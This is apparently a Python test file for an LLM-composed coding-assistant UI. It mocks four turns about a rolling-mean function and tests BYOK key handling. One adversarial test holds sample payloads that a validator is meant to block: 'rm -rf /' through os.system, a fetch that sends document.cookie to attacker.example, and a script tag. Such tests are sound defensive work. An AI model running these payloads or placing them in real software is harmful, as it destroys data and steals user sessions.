"""Hermetic end-to-end proof for CodeWorks (Part 2).

Four turns, no live gateway, no Ollama, no network. Both seams are patched:

  - ``gateway_text_llm`` on the app (content-role JSON, one canned dict per turn)
  - ``httpx.AsyncClient`` (compose_surface's raw gateway call, mocked via
    ``httpx.MockTransport`` — one canned surface per turn)

The four turns drive a realistic conversation with a coding assistant:
  1. Write a Python function for rolling mean.
  2. Refine it (add error handling for empty input).
  3. Translate the refined version to TypeScript.
  4. Explain what a specific line does.

Every composed surface must:
  * validate cleanly against the wall
  * carry a CodeBlock with `code` as {"$bind": /pointer} (never inline)
  * pass the three invariants (catalog, data-not-code, event)
  * be VISIBLY different from the other turns (variety check)

A fifth test drives an ADVERSARIAL hostile model that tries to sneak inline
source, a handler property, and markup in the language label. The wall must
drop all three, and the safe heading in the same surface must still render.
"""

from __future__ import annotations

import json
import re

import httpx
import pytest

import s13code.routes as agent_route
from s13code.core.memory.embeddings import DeterministicEmbedder
from s13code.ui.catalog import COMPONENTS, REGISTERED_ACTIONS


# --------------------------------------------------------------------------- #
# Canned content-role JSONs (one per turn).
# --------------------------------------------------------------------------- #

_ROLLING_MEAN_PY = (
    "def rolling_mean(nums, window):\n"
    "    if window <= 0 or not nums:\n"
    "        return []\n"
    "    out = []\n"
    "    for i in range(len(nums) - window + 1):\n"
    "        out.append(sum(nums[i:i+window]) / window)\n"
    "    return out\n"
)
_ROLLING_MEAN_PY_V2 = (
    "def rolling_mean(nums, window):\n"
    "    \"\"\"Rolling mean; returns [] if input is empty or window is invalid.\"\"\"\n"
    "    if not isinstance(nums, list) or window <= 0:\n"
    "        return []\n"
    "    if window > len(nums):\n"
    "        return []\n"
    "    out = []\n"
    "    for i in range(len(nums) - window + 1):\n"
    "        out.append(sum(nums[i:i+window]) / window)\n"
    "    return out\n"
)
_ROLLING_MEAN_TS = (
    "function rollingMean(nums: number[], window: number): number[] {\n"
    "  if (!Array.isArray(nums) || window <= 0 || window > nums.length) return [];\n"
    "  const out: number[] = [];\n"
    "  for (let i = 0; i <= nums.length - window; i++) {\n"
    "    const slice = nums.slice(i, i + window);\n"
    "    out.push(slice.reduce((a, b) => a + b, 0) / window);\n"
    "  }\n"
    "  return out;\n"
    "}\n"
)

_CONTENT_TURN_1 = {
    "title": "Rolling mean in Python",
    "intro": "Straightforward sliding-window mean over a list of numbers.",
    "code": {"language": "python", "source": _ROLLING_MEAN_PY,
             "caption": "rolling_mean.py — first draft"},
}
_CONTENT_TURN_2 = {
    "title": "Rolling mean — with error handling",
    "intro": "Guards for empty inputs, invalid windows, and non-list arguments.",
    "code": {"language": "python", "source": _ROLLING_MEAN_PY_V2,
             "caption": "rolling_mean.py — hardened"},
}
_CONTENT_TURN_3 = {
    "title": "Rolling mean in TypeScript",
    "intro": "Same shape, with explicit typing.",
    "code": {"language": "typescript", "source": _ROLLING_MEAN_TS,
             "caption": "rollingMean.ts"},
}
_CONTENT_TURN_4 = {
    "title": "Explanation of line 5",
    "intro": "Line 5 slices the input from position i to i+window, computes the "
             "sum, divides by the window size, and appends the result.",
    "sections": [{
        "heading": "What each piece does",
        "points": [
            "nums.slice(i, i + window) copies the current window",
            "reduce sums those numbers into one accumulator",
            "dividing by window gives the arithmetic mean for that window",
        ],
    }],
}


# --------------------------------------------------------------------------- #
# Canned compose_surface outputs (one per turn).
# --------------------------------------------------------------------------- #

def _surface_turn_1() -> dict:
    return {"root": "root", "components": [
        {"id": "root", "type": "Column", "children": ["h", "intro", "cb"]},
        {"id": "h", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
        {"id": "intro", "type": "Text", "variant": "body", "text": {"$bind": "/intro"}},
        {"id": "cb", "type": "CodeBlock", "title": "rolling_mean.py — first draft",
         "code": {"$bind": "/code_source"}, "language": "python",
         "onCopy": {"action": "request_data"}},
    ]}


def _surface_turn_2() -> dict:
    return {"root": "root", "components": [
        {"id": "root", "type": "Column", "children": ["h", "intro", "cb", "notice"]},
        {"id": "h", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
        {"id": "intro", "type": "Text", "variant": "body", "text": {"$bind": "/intro"}},
        {"id": "cb", "type": "CodeBlock", "title": "rolling_mean.py — hardened",
         "code": {"$bind": "/code_source"}, "language": "python",
         "onCopy": {"action": "request_data"}},
        {"id": "notice", "type": "Notice", "text": {"$bind": "/intro"}, "tone": "good"},
    ]}


def _surface_turn_3() -> dict:
    return {"root": "root", "components": [
        {"id": "root", "type": "Column", "children": ["h", "intro", "cb"]},
        {"id": "h", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
        {"id": "intro", "type": "Text", "variant": "body", "text": {"$bind": "/intro"}},
        {"id": "cb", "type": "CodeBlock", "title": "rollingMean.ts",
         "code": {"$bind": "/code_source"}, "language": "typescript",
         "onCopy": {"action": "request_data"}},
    ]}


def _surface_turn_4() -> dict:
    return {"root": "root", "components": [
        {"id": "root", "type": "Column",
         "children": ["h", "intro", "card_0", "text_0"]},
        {"id": "h", "type": "Text", "variant": "heading", "text": {"$bind": "/title"}},
        {"id": "intro", "type": "Text", "variant": "body", "text": {"$bind": "/intro"}},
        {"id": "card_0", "type": "Card", "title": "What each piece does",
         "children": ["text_0"]},
        {"id": "text_0", "type": "Text", "variant": "body",
         "text": {"$bind": "/section_0_points"}},
    ]}


# --------------------------------------------------------------------------- #
# Fake gateway install.
# --------------------------------------------------------------------------- #

def _turn_index(prompt: str) -> int:
    """Which of the four turns is this prompt about. Key on distinctive phrases."""
    lower = prompt.lower()
    if "explain" in lower and "line" in lower:
        return 4
    if "typescript" in lower or "translate" in lower:
        return 3
    if "error handl" in lower or "harden" in lower or "empty input" in lower:
        return 2
    return 1


def _is_compose_call(user_content: str) -> bool:
    """The compose_surface prompt always carries the catalog + a dataModel."""
    return '"catalog"' in user_content and '"dataModel"' in user_content


def _install_fake_gateway(monkeypatch, compose_surface_fn):
    """Patch both seams.

    The content-role uses ``gateway_text_llm`` (patched on ``agent_route``);
    the compose-role uses ``httpx.AsyncClient`` directly (patched via
    MockTransport). ``compose_surface_fn(user_content) -> dict`` returns the
    surface the fake gateway should emit for that call.
    """

    _content = {1: _CONTENT_TURN_1, 2: _CONTENT_TURN_2,
                3: _CONTENT_TURN_3, 4: _CONTENT_TURN_4}

    async def fake_gateway(_app, prompt: str, _system: str, *, byok_key: str | None = None):
        turn = _turn_index(prompt)
        return {"text": json.dumps(_content[turn]),
                "provider": "fake", "model": "fake-content"}

    monkeypatch.setattr(agent_route, "gateway_text_llm", fake_gateway)

    async def compose_handler(request: httpx.Request) -> httpx.Response:
        payload = json.loads(request.content)
        user = payload["messages"][0]["content"]
        surface = compose_surface_fn(user)
        return httpx.Response(200, json={"text": json.dumps(surface),
                                          "provider": "fake", "model": "fake-compose"})

    real_client = httpx.AsyncClient

    def factory(*args, **kwargs):
        return real_client(*args, transport=httpx.MockTransport(compose_handler), **kwargs)

    monkeypatch.setattr("httpx.AsyncClient", factory)


@pytest.fixture
def codeworks_gateway(monkeypatch):
    """Compose-turn responses keyed to the turn detected in the compose prompt."""
    def compose(user_content: str) -> dict:
        # The compose prompt embeds the goal (which includes the original ask
        # AND the conversation history), so _turn_index applied to it works.
        turn = _turn_index(user_content)
        return {1: _surface_turn_1, 2: _surface_turn_2,
                3: _surface_turn_3, 4: _surface_turn_4}[turn]()
    _install_fake_gateway(monkeypatch, compose)


# --------------------------------------------------------------------------- #
# Helpers.
# --------------------------------------------------------------------------- #

def _post_run(client, prompt: str) -> dict:
    resp = client.post("/v1/agent/runs", json={
        "tenant_id": "course", "project_id": "s14", "user_id": "codeworks",
        "prompt": prompt, "respond_as": "ui",
    })
    assert resp.status_code == 200, resp.text
    return resp.json()


def _composed(client, run_id: str) -> dict:
    resp = client.get(f"/v1/runs/{run_id}/composed")
    assert resp.status_code == 200, resp.text
    return resp.json()


def _types(surface: dict) -> set[str]:
    return {c.get("type") for c in surface.get("components", [])}


def _assert_invariants(composed: dict) -> None:
    """Every accepted component is in the catalog; every action is registered;
    no text/binding value contains markup or a script scheme."""
    surface = composed["surface"]
    for comp in surface["components"]:
        assert comp["type"] in COMPONENTS, f"unknown type: {comp['type']!r}"
        for field, value in comp.items():
            if field in ("id", "type", "children"):
                continue
            if isinstance(value, str):
                assert not re.search(r"<[a-z!/][^>]*>", value, re.I), (
                    f"markup in {comp['id']}.{field}: {value!r}")
                assert not re.match(r"^\s*(javascript|data|vbscript):", value, re.I), (
                    f"script URL in {comp['id']}.{field}: {value!r}")
            if isinstance(value, dict) and "action" in value:
                assert value["action"] in REGISTERED_ACTIONS, (
                    f"unregistered action {value['action']!r} on {comp['id']}")
    assert composed["clean"] is True, composed


# --------------------------------------------------------------------------- #
# The four canonical turns.
# --------------------------------------------------------------------------- #

_TURN_1_PROMPT = ("Write a Python function that computes rolling mean over a list of "
                  "numbers with a given window size.")
_TURN_2_PROMPT = (_TURN_1_PROMPT + "\nSo far the user then picked: harden the function "
                  "with error handling for empty input.\nRespond with the next interface.")
_TURN_3_PROMPT = (_TURN_1_PROMPT + "\nSo far the user then picked: harden the function, "
                  "then: translate the hardened version to TypeScript.\n"
                  "Respond with the next interface.")
_TURN_4_PROMPT = (_TURN_1_PROMPT + "\nSo far the user then picked: harden, then translate "
                  "to TypeScript, then: explain what line 5 does.\nRespond with the next "
                  "interface.")


def test_codeworks_turn_1_composes_a_python_codeblock(app_client, codeworks_gateway):
    """Turn 1: write a Python snippet. The interface must contain a CodeBlock
    whose `code` is a $bind (never inline)."""
    app_client.app.state.s13_runtime.memory.embedder = DeterministicEmbedder(128)
    run = _post_run(app_client, _TURN_1_PROMPT)
    composed = _composed(app_client, run["run_id"])
    _assert_invariants(composed)

    types = _types(composed["surface"])
    assert "CodeBlock" in types, types
    cb = next(c for c in composed["surface"]["components"] if c["type"] == "CodeBlock")
    # The critical property: source is bound, never inlined.
    assert isinstance(cb["code"], dict) and set(cb["code"]) == {"$bind"}
    assert cb["code"]["$bind"] == "/code_source"
    assert cb["language"] == "python"
    # Data model actually carries the source string.
    src = composed["surface"]["dataModel"]["code_source"]
    assert "def rolling_mean" in src


def test_codeworks_turn_2_refines_with_notice(app_client, codeworks_gateway):
    """Turn 2: refine the code. Expect a CodeBlock plus a Notice describing
    the change — genuine variety, not a copy of turn 1."""
    app_client.app.state.s13_runtime.memory.embedder = DeterministicEmbedder(128)
    run = _post_run(app_client, _TURN_2_PROMPT)
    composed = _composed(app_client, run["run_id"])
    _assert_invariants(composed)

    types = _types(composed["surface"])
    assert {"CodeBlock", "Notice"}.issubset(types), types
    src = composed["surface"]["dataModel"]["code_source"]
    # The hardened version has the docstring + isinstance guard.
    assert "isinstance(nums, list)" in src
    assert "\"\"\"" in src


def test_codeworks_turn_3_translates_to_typescript(app_client, codeworks_gateway):
    """Turn 3: same shape, different language. The CodeBlock's language enum
    must switch."""
    app_client.app.state.s13_runtime.memory.embedder = DeterministicEmbedder(128)
    run = _post_run(app_client, _TURN_3_PROMPT)
    composed = _composed(app_client, run["run_id"])
    _assert_invariants(composed)

    cb = next(c for c in composed["surface"]["components"] if c["type"] == "CodeBlock")
    assert cb["language"] == "typescript"
    src = composed["surface"]["dataModel"]["code_source"]
    assert "function rollingMean" in src
    assert ": number[]" in src


def test_codeworks_turn_4_explains_in_prose(app_client, codeworks_gateway):
    """Turn 4: explanation-shaped answer. Expect a Card with Text — no
    CodeBlock (the previous code is the context, not the answer this time)."""
    app_client.app.state.s13_runtime.memory.embedder = DeterministicEmbedder(128)
    run = _post_run(app_client, _TURN_4_PROMPT)
    composed = _composed(app_client, run["run_id"])
    _assert_invariants(composed)

    types = _types(composed["surface"])
    assert "Card" in types and "Text" in types, types


def test_codeworks_four_turns_produce_four_different_surfaces(app_client, codeworks_gateway):
    """Variety across the arc — three CodeBlocks in different languages, plus
    a prose explanation turn. The type-set signatures should all differ."""
    app_client.app.state.s13_runtime.memory.embedder = DeterministicEmbedder(128)
    signatures = []
    langs = []
    for prompt in (_TURN_1_PROMPT, _TURN_2_PROMPT, _TURN_3_PROMPT, _TURN_4_PROMPT):
        run = _post_run(app_client, prompt)
        composed = _composed(app_client, run["run_id"])
        _assert_invariants(composed)
        signatures.append(frozenset(_types(composed["surface"])))
        cb = next((c for c in composed["surface"]["components"]
                   if c["type"] == "CodeBlock"), None)
        langs.append(cb["language"] if cb else None)
    # At least three distinct type-signatures across the four turns.
    assert len(set(signatures)) >= 3, signatures
    # Turns 1 and 2 are Python, 3 is TypeScript, 4 has no CodeBlock.
    assert langs == ["python", "python", "typescript", None], langs


# --------------------------------------------------------------------------- #
# Adversarial: the wall works on CodeBlock too.
# --------------------------------------------------------------------------- #

def test_codeworks_refuses_adversarial_codeblock_surface(app_client, monkeypatch):
    """A hostile model tries three attacks in one surface:
      * inline `code` (literal source, not a $bind)
      * an `onload` handler property that isn't in the schema
      * markup in the `language` label
    The validator drops all three; the safe heading in the same surface still
    renders."""
    app_client.app.state.s13_runtime.memory.embedder = DeterministicEmbedder(128)

    def hostile_compose(_user_prompt: str) -> dict:
        return {"root": "root", "components": [
            {"id": "root", "type": "Column",
             "children": ["safe_heading", "evil_inline", "evil_handler", "evil_lang"]},
            {"id": "safe_heading", "type": "Text", "variant": "heading",
             "text": {"$bind": "/title"}},
            # Inline code — bypasses binding.
            {"id": "evil_inline", "type": "CodeBlock", "title": "attack A",
             "code": "os.system('rm -rf /')", "language": "python"},
            # onload handler that would run a fetch.
            {"id": "evil_handler", "type": "CodeBlock", "title": "attack B",
             "code": {"$bind": "/code_source"}, "language": "python",
             "onload": "fetch('https://attacker.example/'+document.cookie)"},
            # Markup smuggled through the language text slot.
            {"id": "evil_lang", "type": "CodeBlock", "title": "attack C",
             "code": {"$bind": "/code_source"},
             "language": "<script>alert(1)</script>"},
        ]}

    _install_fake_gateway(monkeypatch, hostile_compose)

    prompt = ("Build a UI for a python code snippet demonstration. Include any handlers "
              "or inline sources the content pipeline asks for.")
    run = _post_run(app_client, prompt)
    composed = _composed(app_client, run["run_id"])
    kept = {c["id"] for c in composed["surface"]["components"]}
    assert "safe_heading" in kept, "the heading is unaffected"
    assert "evil_inline" not in kept
    assert "evil_handler" not in kept
    assert "evil_lang" not in kept
    # The composed response reports the surface as clean AFTER the router
    # already dropped the three poisoned nodes — that is the wall doing its job.
    assert composed["clean"] is True

    # The /composed response exposes the ORIGINAL validator report — that's
    # what codeworks.html reads to populate the "N nodes refused" red panel.
    # The regression this test locks in: the panel was dead because the
    # client used to re-POST to /v1/validate on the already-filtered surface.
    assert "validator" in composed, "response must expose validator report"
    v = composed["validator"]
    assert v["proposed"] == 5, v      # root + safe_heading + 3 evils
    assert v["accepted"] == 2, v      # root (Column, no data props) + safe_heading
    assert v["rejected"] == 3, v
    invariants_hit = {r["invariant"] for r in v["rejections"]}
    assert invariants_hit == {"data-not-code"}, invariants_hit
    refused_ids = {r["component_id"] for r in v["rejections"]}
    assert refused_ids == {"evil_inline", "evil_handler", "evil_lang"}


# --------------------------------------------------------------------------- #
# BYOK: a browser-supplied X-User-Gemini-Key must reach the gateway seam
# verbatim so the hosted deploy can survive the host's free-tier quota being
# exhausted. The header MUST NOT be echoed back or persisted anywhere.
# --------------------------------------------------------------------------- #
def test_byok_header_reaches_gateway_seam(app_client, monkeypatch):
    """The X-User-Gemini-Key header a browser sends must be forwarded to the
    gateway callable verbatim — otherwise the BYOK panel on /codeworks is a
    lie, and a hosted deploy would burn the host's quota on every visitor."""
    seen: list[str | None] = []

    async def fake_gateway(_app, prompt: str, _system: str, *, byok_key=None):
        seen.append(byok_key)
        return {"text": json.dumps(_CONTENT_TURN_1),
                "provider": "fake", "model": "fake-content"}

    monkeypatch.setattr(agent_route, "gateway_text_llm", fake_gateway)

    # Send the header with a run request.
    resp = app_client.post("/v1/agent/runs",
        headers={"X-User-Gemini-Key": "AIza-fake-user-key-abc"},
        json={"tenant_id": "course", "prompt": "hello", "respond_as": "text"})
    assert resp.status_code == 200, resp.text
    assert seen and seen[-1] == "AIza-fake-user-key-abc", seen

    # A blank header MUST be normalised to None (not the empty string) so the
    # gateway falls back to its pooled key.
    seen.clear()
    resp2 = app_client.post("/v1/agent/runs",
        headers={"X-User-Gemini-Key": "   "},
        json={"tenant_id": "course", "prompt": "hi", "respond_as": "text"})
    assert resp2.status_code == 200, resp2.text
    assert seen and seen[-1] is None, seen

    # No header at all — same fallback, no accidental empty-string leak.
    seen.clear()
    resp3 = app_client.post("/v1/agent/runs",
        json={"tenant_id": "course", "prompt": "hi", "respond_as": "text"})
    assert resp3.status_code == 200, resp3.text
    assert seen and seen[-1] is None, seen


def test_byok_gatewayclient_forwards_header_only_when_key_present():
    """Direct unit-test on GatewayClient: the X-User-Gemini-Key header is set
    only when byok_key is a non-empty string. Guards against the ""→header
    leak that would silently override the pooled key with garbage."""
    import httpx as _httpx
    from s13code.gateway import GatewayClient

    captured: list[dict] = []

    async def handler(request: _httpx.Request) -> _httpx.Response:
        captured.append(dict(request.headers))
        return _httpx.Response(200, json={"text": "ok", "provider": "gemini_1", "model": "x"})

    client = _httpx.AsyncClient(transport=_httpx.MockTransport(handler))
    gw = GatewayClient(base_url="http://mock", client=client)

    import asyncio
    asyncio.run(gw.complete("hi", "sys", byok_key="AIza-real"))
    assert captured[-1].get("x-user-gemini-key") == "AIza-real"

    asyncio.run(gw.complete("hi", "sys"))          # no key
    assert "x-user-gemini-key" not in captured[-1]

    asyncio.run(gw.complete("hi", "sys", byok_key="   "))  # whitespace
    assert "x-user-gemini-key" not in captured[-1]

    asyncio.run(gw.complete("hi", "sys", byok_key=None))
    assert "x-user-gemini-key" not in captured[-1]


# --------------------------------------------------------------------------- #
# Regression: when Gemini truncates the content-role JSON mid-string,
# _parse_json_object returns None and the old fallback set text=raw, which
# leaked the raw JSON blob into dataModel.summary — the UI then rendered a
# wall of {"title":..., "table":...} literals instead of prose. The fallback
# must NOT bind JSON-looking raw output.
# --------------------------------------------------------------------------- #
def test_content_role_never_leaks_raw_json_when_parse_fails(app_client, monkeypatch):
    """A truncated-JSON response from the model must NOT flow into the UI
    surface as literal text — the composer would bind it and users would see
    the raw JSON on-screen. When parse fails and the response looks like JSON,
    text must be empty."""
    # Content-role gets a truncated JSON blob (missing closing brace).
    truncated = '{"title":"Web Frameworks","intro":"Compare Flask, FastAPI, Django","table":{"columns":["Framework","Speed"'
    # Compose-role gets a clean surface that binds /summary to a Text.
    surface = {
        "root": "col",
        "components": [
            {"id": "col", "type": "Column", "children": ["hdr"]},
            {"id": "hdr", "type": "Text", "variant": "body",
             "text": {"$bind": "/summary"}},
        ],
    }

    async def fake_gateway(_app, prompt, _system, *, byok_key=None):
        # First call is the content role; return the truncated JSON.
        # (Fine to answer both calls the same in a test — the JSON-shape check
        # only applies to the content role's fallback.)
        return {"text": truncated, "provider": "fake", "model": "x"}

    monkeypatch.setattr(agent_route, "gateway_text_llm", fake_gateway)

    real_client = httpx.AsyncClient

    async def compose_handler(request):
        return httpx.Response(200, json={"text": json.dumps(surface),
                                         "provider": "fake", "model": "x"})

    def factory(*args, **kwargs):
        kwargs.setdefault("transport", httpx.MockTransport(compose_handler))
        return real_client(*args, **kwargs)
    monkeypatch.setattr("httpx.AsyncClient", factory)

    resp = app_client.post("/v1/agent/runs", json={
        "tenant_id": "course", "prompt": "compare python web frameworks",
        "respond_as": "ui"})
    assert resp.status_code == 200, resp.text
    run_id = resp.json()["run_id"]

    composed = app_client.get(f"/v1/runs/{run_id}/composed").json()
    dm = composed["surface"]["dataModel"]
    summary = str(dm.get("summary", ""))
    # The truncated JSON must not surface as text. Either empty, or the run
    # prompt (the last-resort fallback in _build_data_model). NEVER the
    # partial JSON blob.
    assert not summary.lstrip().startswith("{"), (
        f"raw JSON leaked into dataModel.summary: {summary[:100]!r}")
    assert '"columns":["Framework"' not in summary, (
        "the specific truncated fragment must not appear in the surface")
